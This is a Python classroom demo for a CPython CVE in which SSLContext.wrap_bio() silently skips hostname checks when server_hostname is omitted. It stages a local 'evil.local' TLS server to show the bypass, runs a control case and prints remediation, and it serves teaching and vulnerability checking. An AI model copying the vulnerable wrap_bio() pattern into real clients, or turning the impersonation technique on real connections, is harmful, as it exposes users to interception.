#!/usr/bin/env python3
"""
CVE-2026-19553 classroom demo
==============================
ssl.SSLContext.wrap_bio() hostname-verification bypass.

What this shows:
  A client sets check_hostname = True (believing hostname verification is on)
  and calls wrap_bio() without passing server_hostname. On a vulnerable
  CPython build, that check is silently skipped and the handshake succeeds
  against a certificate that is validly signed by a trusted CA, but issued
  for a completely different hostname (an "attacker" site) than the one the
  client meant to reach.

Everything here runs on localhost: a local CA, a local "attacker" server, and
a local client. No real network traffic leaves the machine.

Usage:
    bash gen_certs.sh      # one-time: build the local CA + attacker cert
    python3 demo.py        # run the demo

Run once on a vulnerable interpreter (CPython < 3.12.15 / < 3.13.16 /
< 3.14.8 / < 3.10.22) to show the bug, and once on a patched one to show
the fix — that's your identification + exploitation + remediation in one
script.
"""

import os
import socket
import ssl
import sys
import threading
import time

HOST = "127.0.0.1"
PORT = 9443
CERT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")
TARGET_HOSTNAME = "realbank.local"   # what the client THINKS it's connecting to
ATTACKER_HOSTNAME = "evil.local"     # what the cert actually says


class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    END = "\033[0m"


def banner(text):
    line = "=" * 70
    print(f"\n{C.BOLD}{C.CYAN}{line}{C.END}")
    print(f"{C.BOLD}{C.CYAN}{text}{C.END}")
    print(f"{C.BOLD}{C.CYAN}{line}{C.END}")


def check_certs():
    needed = ["ca.crt", "evil.crt", "evil.key"]
    missing = [f for f in needed if not os.path.exists(os.path.join(CERT_DIR, f))]
    if missing:
        print(f"{C.RED}Missing cert files: {missing}{C.END}")
        print(f"Run {C.BOLD}bash gen_certs.sh{C.END} first.")
        sys.exit(1)


_server_ready = threading.Event()


def run_fake_server():
    """A TLS server presenting a legitimately CA-signed certificate —
    but issued for evil.local, not the realbank.local the client wants."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(
        os.path.join(CERT_DIR, "evil.crt"),
        os.path.join(CERT_DIR, "evil.key"),
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))
    sock.listen(5)
    _server_ready.set()
    while True:
        try:
            conn, _ = sock.accept()
        except OSError:
            return
        try:
            tls_conn = ctx.wrap_socket(conn, server_side=True)
            tls_conn.recv(1024)
            tls_conn.sendall(b"hello from evil.local\n")
            tls_conn.close()
        except Exception:
            pass


def start_server():
    t = threading.Thread(target=run_fake_server, daemon=True)
    t.start()
    _server_ready.wait(timeout=5)
    time.sleep(0.2)


def print_cert_details(cert):
    """Pretty-print the certificate the handshake accepted, so the report
    shows exactly what was let through — not just that something was."""
    def flatten(field):
        return ", ".join(f"{k}={v}" for rdn in field for k, v in rdn)

    subject = flatten(cert.get("subject", ()))
    issuer = flatten(cert.get("issuer", ()))
    san = cert.get("subjectAltName", ())
    san_str = ", ".join(f"{t}:{v}" for t, v in san) if san else "(none)"

    print(f"  {C.YELLOW}--- Accepted certificate ---{C.END}")
    print(f"  {C.YELLOW}Subject          :{C.END} {subject}")
    print(f"  {C.YELLOW}Issuer           :{C.END} {issuer}")
    print(f"  {C.YELLOW}Valid from       :{C.END} {cert.get('notBefore', '?')}")
    print(f"  {C.YELLOW}Valid until      :{C.END} {cert.get('notAfter', '?')}")
    print(f"  {C.YELLOW}Subject Alt Name :{C.END} {san_str}")
    print(f"  {C.YELLOW}Serial number    :{C.END} {cert.get('serialNumber', '?')}")
    print(f"  {C.YELLOW}----------------------------{C.END}")


def pump_handshake(sslobj, in_bio, out_bio, raw_sock, max_rounds=50):
    """Manually drive the TLS handshake over the memory BIOs, as any
    asyncio-style framework using wrap_bio() has to."""
    for _ in range(max_rounds):
        try:
            sslobj.do_handshake()
            return
        except ssl.SSLWantReadError:
            pending = out_bio.read()
            if pending:
                raw_sock.sendall(pending)
            data = raw_sock.recv(4096)
            if not data:
                raise ConnectionError("peer closed connection during handshake")
            in_bio.write(data)
    raise TimeoutError("handshake did not complete in time")


def attempt_connection(label, server_hostname, require_hostname=True):
    """Connects to the fake server using wrap_bio(). Returns True if the
    handshake succeeded (i.e. the connection was accepted), False if it
    was correctly rejected."""
    print(f"\n{C.BOLD}{label}{C.END}")
    print(f"  {C.DIM}check_hostname = True{C.END}")
    print(f"  {C.DIM}server_hostname passed to wrap_bio() = {server_hostname!r}{C.END}")

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.load_verify_locations(os.path.join(CERT_DIR, "ca.crt"))
    ctx.check_hostname = True
    ctx.verify_mode = ssl.CERT_REQUIRED

    raw_sock = socket.create_connection((HOST, PORT), timeout=5)
    raw_sock.settimeout(5)
    in_bio = ssl.MemoryBIO()
    out_bio = ssl.MemoryBIO()

    try:
        sslobj = ctx.wrap_bio(in_bio, out_bio, server_hostname=server_hostname)
        pump_handshake(sslobj, in_bio, out_bio, raw_sock)
        pending = out_bio.read()
        if pending:
            raw_sock.sendall(pending)

        cert = sslobj.getpeercert()
        cn = dict(x[0] for x in cert["subject"])["commonName"]
        print(f"  {C.RED}{C.BOLD}>> HANDSHAKE SUCCEEDED{C.END}  "
              f"{C.RED}(accepted a cert for {cn!r} while trying to reach "
              f"{TARGET_HOSTNAME!r}){C.END}")
        print_cert_details(cert)
        return True
    except ssl.SSLCertVerificationError as e:
        print(f"  {C.GREEN}{C.BOLD}>> REJECTED{C.END}  "
              f"{C.GREEN}SSLCertVerificationError: {e}{C.END}")
        return False
    except ValueError as e:
        print(f"  {C.GREEN}{C.BOLD}>> REJECTED before handshake{C.END}  "
              f"{C.GREEN}ValueError: {e}{C.END}")
        return False
    finally:
        raw_sock.close()


def main():
    check_certs()
    start_server()

    banner("CVE-2026-19553 — SSLContext.wrap_bio() hostname bypass demo")
    print(f"Interpreter under test: {C.BOLD}Python {sys.version.split()[0]}{C.END} "
          f"({sys.executable})")
    print(f"Scenario: client wants {C.BOLD}{TARGET_HOSTNAME}{C.END}, but is actually "
          f"talking to an attacker server")
    print(f"presenting a CA-trusted certificate for "
          f"{C.BOLD}{ATTACKER_HOSTNAME}{C.END}.")

    banner("Case A — Vulnerable configuration (the bug)")
    print("Developer sets check_hostname=True but forgets to pass server_hostname.")
    vulnerable = attempt_connection(
        "wrap_bio() with server_hostname OMITTED", server_hostname=None
    )

    banner("Case B — Correct configuration (control)")
    print("Same client, but server_hostname is passed as it should be.")
    attempt_connection(
        "wrap_bio() with server_hostname='realbank.local'",
        server_hostname=TARGET_HOSTNAME,
    )

    banner("Verdict")
    if vulnerable:
        print(f"{C.RED}{C.BOLD}This interpreter IS VULNERABLE to CVE-2026-19553.{C.END}")
        print("Hostname verification was silently skipped in Case A — the "
              "handshake succeeded")
        print("against a certificate for the wrong host, with no error raised "
              "at all.")
        print(f"\n{C.YELLOW}Remediation (pick one):{C.END}")
        print("  1. Upgrade to a patched CPython (>=3.12.15 / >=3.13.16 / "
              ">=3.14.8 / >=3.10.22).")
        print("  2. Until then: always pass a non-empty server_hostname to "
              "wrap_bio().")
    else:
        print(f"{C.GREEN}{C.BOLD}This interpreter is NOT vulnerable "
              f"(patched, or Case A was rejected).{C.END}")
        print("Omitting server_hostname with check_hostname=True now correctly "
              "raises an error")
        print("instead of silently skipping the check.")
    print()


if __name__ == "__main__":
    main()
